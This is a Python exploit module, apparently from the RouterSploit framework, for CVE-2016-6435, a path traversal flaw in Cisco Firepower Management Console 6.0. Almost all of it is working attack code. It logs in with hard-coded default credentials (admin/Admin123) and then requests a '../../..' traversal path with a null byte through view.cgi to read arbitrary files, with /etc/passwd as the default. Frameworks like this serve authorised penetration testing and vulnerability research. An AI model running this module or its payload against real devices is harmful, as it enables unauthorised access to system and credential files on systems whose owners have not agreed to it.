import requests
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Cisco Firepower Management 6.0 Path Traversal",
        "description": "Module exploits Cisco Firepower Management 6.0 Path Traversal vulnerability. "
                       "If the target is vulnerable, it is possible to retrieve content of the arbitrary files.",
        "authors": (
            "Matt",  # vulnerability discovery
            "sinn3r",  # Metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6435",
            "https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking",
        ),
        "devices": (
            "Cisco Firepower Management Console 6.0",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    path = OptString("/etc/passwd", 'File to read through vulnerability')
    username = OptString("admin", 'Default username to log in')
    password = OptString("Admin123", 'Default password to log in')

    def __init__(self):
        self.session = None

    def run(self):
        self.session = requests.Session()

        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Trying to authenticate")
            if self.login():
                file_path = "../../..{}".format(self.path)
                path = "/events/reports/view.cgi?download=1&files={}%00".format(file_path)

                print_status("Requesting: {}".format(file_path))
                response = self.http_request(
                    method="GET",
                    path=path,
                    session=self.session
                )

                if response is None:
                    print_error("Exploit failed")
                    return

                print_status("Reading response...")

                if not len(response.text) or "empty or is not available to view" in response.text:
                    print_error("Exploit failed. Empty response.")
                else:
                    print_info(response.text)

            else:
                print_error("Exploit failed. Could not authenticate.")
        else:
            print_error("Exploit failed. Target seems to be not vulnerable.")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.cgi?logout=1"
        )

        if response is not None and "6.0.1" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable

    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
            "target": "",
        }

        response = self.http_request(
            method="POST",
            path="/login.cgi?logout=1",
            data=data,
            allow_redirects=False,
            timeout=30,
            session=self.session
        )

        if response is None:
            return False

        if response.status_code == 302 and "CGISESSID" in response.cookies.get_dict().keys():
            print_status("CGI Session ID: {}".format(response.cookies.get_dict()['CGISESSID']))
            print_success("Authenticated as {}:{}".format(self.username, self.password))
            return True

        return False
